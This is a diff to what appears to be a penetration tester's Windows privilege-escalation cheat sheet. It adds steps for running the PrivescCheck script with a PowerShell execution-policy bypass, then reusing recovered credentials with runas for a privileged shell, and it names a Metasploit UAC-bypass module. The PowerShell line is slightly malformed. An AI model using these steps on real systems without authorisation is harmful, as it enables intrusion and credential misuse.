@@ -1,5 +1,17 @@
 # Windows Privileges Escalation
 
+### PrivescCheck
+```cmd
+• get this script https://github.com/itm4n/PrivescCheck
+• paste it on the target in PrivescCheck.ps1
+• powershell.exe -ep bypass -c “. .\ PrivescCheck.ps1; InvokePrivescCheck”
+• use the credentials resulted (username:password)
+• runas.exe /user:username cmd
+• enter the password
+• you will get a privileged cmd
+```
+
+
 ### UAC Bypass
 ```cmd
 • exploit/windows/local/bypassuac_injection
